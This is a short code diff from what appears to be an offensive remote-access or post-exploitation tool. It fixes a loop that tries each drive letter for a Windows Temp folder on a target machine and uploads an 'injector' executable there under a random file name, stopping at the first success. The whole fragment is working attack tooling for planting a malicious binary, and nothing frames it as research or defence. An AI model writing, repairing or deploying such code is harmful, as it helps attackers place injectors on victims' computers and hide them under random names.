@@ -253,10 +253,11 @@ if (fs.existsSync(args.config)) {
         const characters = 'CDEFGHIJKLMNOPQRSTUVWXYZAB';
         for (let index = 0; index < characters.length; ++index) {
           let uploadPath = "[DRIVE]:\\Windows\\Temp"
-          userDataPath = userDataPath.replace('[DRIVE]', characters.charAt(index))
-          ls = await interact.ls(userDataPath)
+          uploadPath = uploadPath.replace('[DRIVE]', characters.charAt(index))
+          let ls = await interact.ls(uploadPath)
           if (ls.getExists()) {
             upload = await interact.upload(`${uploadPath}\\${randomFileName()}.exe`, injectorData)
+	    break
           }
         }
         break
